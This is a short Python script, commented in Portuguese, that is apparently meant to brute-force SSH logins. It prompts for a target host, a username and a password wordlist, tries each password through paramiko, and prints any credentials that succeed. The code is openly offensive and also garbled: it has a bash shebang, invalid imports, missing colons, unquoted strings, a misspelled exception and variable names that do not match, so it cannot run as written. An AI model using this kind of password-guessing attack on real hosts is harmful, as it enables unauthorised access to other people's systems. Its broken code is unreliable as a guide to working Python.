#!/bin/bash
from os import path.exists
import sys
import paramiko
import socket

global alvo, usuario, input_file

line = "\n--------------------------------------------------\n"

try:
	host = raw_input("Digite o alvo")
	usuario = raw_input("Digite o usuario")
	input_file = raw_input ("Arquivo das senhas")
	
	if path.exists(input_file) == False:
		print("Insira a porra do arquivo!!!")
		sys.exit(3)
except KeyboardInterrupt:
	print ("Maneira bonita de interromper o ataque")
	sys.exit(3)
	
def brute_ssh(senha, status=0)
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	try:
		brute_ssh(algo, porta=22, password=senha)
	except paramiko.AuthenticatiAddPolicy
		#se caiu aqui a autenticação falhou
		status = 1
	except socket.error, e:
		#se caiu aqui pq deu merda e provavel q a conexao caiu
		status = 2
		
		ssh.close()
		return status
		
	input_file = open(input_file)
	
	for i in input_file.readlines():
		senha = i.strip("\n")
		try:
			resp = ssh_connect(senha)
			
			if resp == 0
				print("%s[*] Usuario [*]Senha: %s%s" % (linha, login, senha, linha))
				sys.exit(0)
			elif resposta == 1
				print([*] Usuario: %s [*]Senha: %s -------> Incorreto % (senha,login))
			elif resposta= 2
				print (Conexão nao foi estabilizada com endereço % (host))
		except Exception, e:
			print e
			pass
	input_file.close()
				
				
				
